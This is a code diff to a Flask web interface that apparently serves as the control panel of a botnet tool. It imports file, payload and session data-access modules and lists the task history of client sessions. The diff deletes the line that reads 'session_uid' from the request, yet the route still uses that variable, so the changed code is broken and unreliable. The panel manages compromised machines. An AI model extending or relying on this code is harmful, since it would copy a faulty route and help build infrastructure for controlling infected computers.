@@ -3,7 +3,7 @@ import os
 from flask import current_app, Blueprint, flash, redirect, render_template, request, url_for, send_from_directory
 from flask_login import current_user, login_required
 
-from botnet.dao import file_dao, payload_dao, session_dao
+from botnet.dao import file_dao, payload_dao
 from web_gui.utils import get_sessions_serialized, get_tasks_serialized
 
 # Blueprint
@@ -49,13 +49,7 @@ def files():
 @root.route("/tasks", methods=["GET"])
 @login_required
 def tasks():
-	"""Task history for a client"""
-	session_uid = request.args.get('session_uid')
-
-	# get serialized task history from database
 	tasks = get_tasks_serialized(session_uid)
-
-	# show task history as a table
 	return render_template("tasks.html", 
 							tasks=tasks, 
 							session_uid=session_uid,
